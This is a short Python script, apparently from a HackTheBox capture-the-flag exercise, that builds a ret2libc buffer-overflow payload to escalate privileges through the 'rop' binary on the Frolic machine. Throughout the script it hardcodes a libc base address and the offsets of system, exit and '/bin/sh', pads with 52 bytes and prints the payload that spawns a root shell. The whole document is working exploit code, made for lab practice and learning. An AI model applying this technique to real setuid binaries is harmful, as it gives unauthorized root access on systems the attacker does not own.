#
#  Privilege Escalation Exploit for hackTheBox Frolic
#  exploit for rop.c
#  From IppSec https://youtu.be/b6WGQSJu_zQ
# 

from subprocess import call
import struct

# libc base address using:
# ldd rop | grep libc.so.6

libc_base_addr = 0xb7e19000

# readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system

system_off = 0x0003ada0
exit_off   = 0x0002e9d0

# strings -a -t x /lib32/libc.so.6 | grep /bin/sh

binsh_off  = 0x0015ba0b

binsh_addr  = struct.pack("<I", libc_base_addr + binsh_off)
system_addr = struct.pack("<I", libc_base_addr + system_off)
exit_addr   = struct.pack("<I", libc_base_addr + exit_off)

junk = ('A' * 52)

payload = junk + system_addr +  exit_addr + binsh_addr

print(payload)